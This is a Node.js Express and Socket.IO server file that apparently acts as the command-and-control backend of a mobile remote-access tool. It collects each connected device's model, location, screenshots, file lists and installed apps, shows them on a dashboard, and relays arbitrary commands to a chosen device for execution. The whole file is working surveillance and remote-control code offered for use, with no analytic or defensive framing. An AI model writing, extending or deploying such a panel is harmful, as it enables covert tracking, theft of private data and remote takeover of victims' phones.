const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;

let devices = {};

app.use(express.static(path.join(__dirname, 'public')));

app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

app.get('/api/devices', (req, res) => {
    res.json(Object.values(devices));
});

io.on('connection', (socket) => {
    console.log(`[+] New connection: ${socket.id}`);

    socket.on('register', (data) => {
        try {
            const info = JSON.parse(data);
            devices[socket.id] = {
                id: socket.id,
                info: info,
                connected: true,
                lastSeen: Date.now()
            };
            io.emit('device_connected', devices[socket.id]);
            console.log(`[+] Device: ${info.model || 'Unknown'}`);
        } catch(e) {}
    });

    socket.on('location', (data) => {
        try {
            const loc = JSON.parse(data);
            io.emit('location_update', { id: socket.id, loc: loc });
        } catch(e) {}
    });

    socket.on('screenshot', (data) => {
        io.emit('screenshot_update', { id: socket.id, image: data });
    });

    socket.on('file_list', (data) => {
        io.emit('file_list_update', { id: socket.id, files: data });
    });

    socket.on('app_list', (data) => {
        io.emit('app_list_update', { id: socket.id, apps: data });
    });

    socket.on('command', (cmd) => {
        const target = io.sockets.sockets.get(cmd.deviceId);
        if (target) {
            target.emit('execute', cmd.command);
        }
    });

    socket.on('disconnect', () => {
        if (devices[socket.id]) {
            devices[socket.id].connected = false;
            io.emit('device_disconnected', socket.id);
        }
    });
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});
